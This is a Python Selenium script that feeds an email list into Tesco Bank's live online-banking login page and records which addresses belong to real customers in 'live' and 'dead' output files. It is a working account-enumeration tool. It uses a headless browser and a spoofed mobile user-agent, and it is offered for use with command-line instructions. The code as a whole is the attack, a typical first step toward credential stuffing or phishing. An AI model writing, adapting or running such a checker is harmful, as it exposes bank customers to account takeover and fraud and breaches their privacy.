#-*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from datetime import datetime
import time
import sys
import requests
import sys
import json
import loggin

url = "https://identity.tescobank.com/pf/adapter2adapter.ping"
header = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
payload={'username':"",
"OLB_REMEMBER_USERNAME":"Y",
"screen":"banking"}

if __name__=='__main__':
	live_file="live_users.txt"
	dead_file="dead_users.txt"
	print("valid_tescobank.com_email_checker")
	if len(sys.argv)<2:
		print("pelase use the app like that\n    python tescobank_checker.py [emails_list] \n or python tescobank_checker.py [emails_list] [live_file] [dead_file]")
		sys.exit()
	elif len(sys.argv)>2:
		live_file=sys.argv[2]
	elif len(sys.argv)>3:
		dead_file=sys.argv[3]
	emails=open(sys.argv[1],'r').read().split('\n')
	options = webdriver.ChromeOptions()
	options.add_argument('--headless')
	prefs={"profile.managed_default_content_settings.images": 2}
	options.add_experimental_option('prefs', prefs)
	prefs={'disk-cache-size': 10240}
	options.add_experimental_option('prefs', prefs)
	driver = webdriver.Chrome(chrome_options=options)
	for email in emails:
		if not(email) or len(email)<4:
			continue
		"""
		payload["username"]=email
		s=requests.post(url,data=json.dumps(payload),headers=header)
		responce=s.content
		if 'Username not recognised' in responce:
			print(email,"not registed")
		else:
			print(email,"registed")
		"""
		try:
			#driver = webdriver.Chrome()
			driver.get(url)
			wait(driver, 50).until(EC.presence_of_element_located((By.ID, 'OLB_UNIQUEID')))
			c_mail=driver.find_element_by_id("OLB_UNIQUEID")
			c_mail.send_keys(email)
			wait(driver, 50).until(EC.presence_of_element_located((By.ID, 'ensCloseBanner')))
			try:
				driver.execute_script("ensPrivacyBootstrap.customHideBanner()")
			except:
				pass
			wait(driver, 50).until(EC.presence_of_element_located((By.ID, 'submit-OLB_UNIQUEID')))
			login=driver.find_element_by_id("submit-OLB_UNIQUEID")
			login.click()
			#time.sleep(1)
			#print(driver.current_url)
			if "login" in driver.current_url:
				print("email/username valid",email)
				responce="valid"
				F1=open(live_file,'a')
				F1.write(email+'\n')
				F1.close()
			else:
				print("email/username invalid",email)
				responce="invalid"
				F2=open(dead_file,'a')
				F2.write(email+'\n')
				F2.close()
			F3=open("result.txt",'a')
			a=datetime.now()
			F3.write(a.strftime("%Y-%d-%h %H:%M:%S"))
			F3.write("\t"+email+'\t'+responce+"\n")
			F3.close()
			#driver.close()
			#time.sleep(1)
		except Exception as e:
			print(e)
			F1.close()
			F2.close()
			F3.close()
			driver.quit()
			time.sleep(1)
			driver = webdriver.PhantomJS()
	driver.quit()